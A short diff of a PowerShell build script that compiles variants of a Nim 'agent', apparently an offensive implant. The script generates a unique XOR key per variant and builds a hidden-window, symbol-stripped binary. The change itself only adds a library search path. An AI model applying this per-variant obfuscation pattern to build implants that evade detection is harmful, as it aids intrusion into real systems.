@@ -80,7 +80,7 @@ try {
         # Generate a unique XOR key for this variant
         New-XorKeyNim -OutPath $xorKeyPath
         Write-Host "[*] Building $name ..." -ForegroundColor Cyan
-        $flags = @("c", "-d:release", "-d:ssl", "--opt:size", "--app:gui", "--passL:-s") + $defines
+        $flags = @("c", "-d:release", "-d:ssl", "--opt:size", "--app:gui", "--passL:-s", "--path:common") + $defines
         & $Nim @flags `
             --out:(Join-Path $BuildDir $name) `
             (Join-Path $SrcDir "agent.nim")
